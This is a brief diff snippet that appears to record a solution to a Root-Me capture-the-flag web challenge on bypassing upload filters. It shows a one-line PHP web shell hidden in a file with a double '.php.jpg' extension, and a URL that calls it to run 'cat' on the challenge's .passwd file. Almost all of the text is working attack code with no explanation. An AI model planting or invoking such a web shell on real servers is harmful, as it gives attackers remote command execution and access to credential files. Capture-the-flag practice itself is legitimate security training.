@@ -1,0 +1,3 @@
+http://challenge01.root-me.org/web-serveur/ch20/galerie/upload/4a7selm4r9rl9f18adlrp6to94/fot.php.jpg?cmd=cat%20/challenge/web-serveur/ch20/.passwd
+Fo.php.jpg contents
+<?php echo system($_GET['cmd']); ?>
